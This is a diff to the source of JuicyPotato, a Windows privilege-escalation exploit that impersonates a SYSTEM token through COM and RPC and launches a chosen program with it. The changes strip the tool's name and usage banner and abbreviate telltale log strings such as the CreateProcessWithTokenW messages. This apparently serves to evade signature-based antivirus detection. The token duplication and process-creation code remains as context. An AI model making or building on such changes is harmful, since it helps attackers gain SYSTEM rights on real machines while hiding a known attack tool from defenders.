@@ -75,23 +75,7 @@ int IsTokenSystem(HANDLE tok)
 
 void usage()
 {
-	printf("JuicyPotato v%s \n\n", VERSION);
-
-	printf("Mandatory args: \n"
-		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both\n"
-		"-p <program>: program to launch\n"
-		"-l <port>: COM server listen port\n"
-	);
-
-	printf("\n\n");
-	printf("Optional args: \n"
-		"-m <ip>: COM server listen address (default 127.0.0.1)\n"
-		"-a <argument>: command line argument to pass to program (default NULL)\n"
-		"-k <ip>: RPC server ip address (default 127.0.0.1)\n"
-		"-n <port>: RPC server listen port (default 135)\n"
-		"-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})\n"
-		"-z only test CLSID and print token's user\n"
-	);
+	return;
 }
 
 PotatoAPI::PotatoAPI() {
@@ -656,7 +640,7 @@ int Juicy(wchar_t *clsid, BOOL brute)
 			TOKEN_PRIVILEGES tkp;
 			SECURITY_DESCRIPTOR sdSecurityDescriptor;
 			if (!TEST_mode)
-				printf("\n[+] authresult %d\n", test->negotiator->authResult);
+				printf("\n[+] auth result %d\n", test->negotiator->authResult);
 
 			fflush(stdout);
 
@@ -680,7 +664,7 @@ int Juicy(wchar_t *clsid, BOOL brute)
 
 			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf("[-] Error getting token type: error code 0x%lx\n", GetLastError());
+				printf("[-] Error getting   type: error code 0x%lx\n", GetLastError());
 
 			result = DuplicateTokenEx(elevated_token,
 				TOKEN_ALL_ACCESS,
@@ -692,7 +676,7 @@ int Juicy(wchar_t *clsid, BOOL brute)
 
 			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf("Error getting token type: error code 0x%lx\n", GetLastError());
+				printf("Error getting   type: error code 0x%lx\n", GetLastError());
 
 			DWORD SessionId;
 			PROCESS_INFORMATION pi;
@@ -732,11 +716,11 @@ int Juicy(wchar_t *clsid, BOOL brute)
 
 				if (!result)
 				{
-					printf("\n[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
+					printf("\n[-] cpwtw Failed to create proc: %d\n", GetLastError());
 				}
 				else
 				{
-					printf("\n[+] CreateProcessWithTokenW OK\n");
+					printf("\n[+] cpwtw OK\n");
 					break;
 				}
 			} 
@@ -754,10 +738,10 @@ int Juicy(wchar_t *clsid, BOOL brute)
 				);
 
 				if (!result) {
-					printf("\n[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
+					printf("\n[-] cpau Failed to create proc: %d\n", GetLastError());
 				}
 				else {
-					printf("\n[+] CreateProcessAsUser OK\n");
+					printf("\n[+] cpau OK\n");
 					break;
 				}
 			}//end argv
@@ -765,7 +749,7 @@ int Juicy(wchar_t *clsid, BOOL brute)
 			if (!result)
 				break;
 			else {
-				printf("Waiting for auth...");
+				printf("Waiting for auth..");
 				Sleep(500);
 				fflush(stdout);
 			}
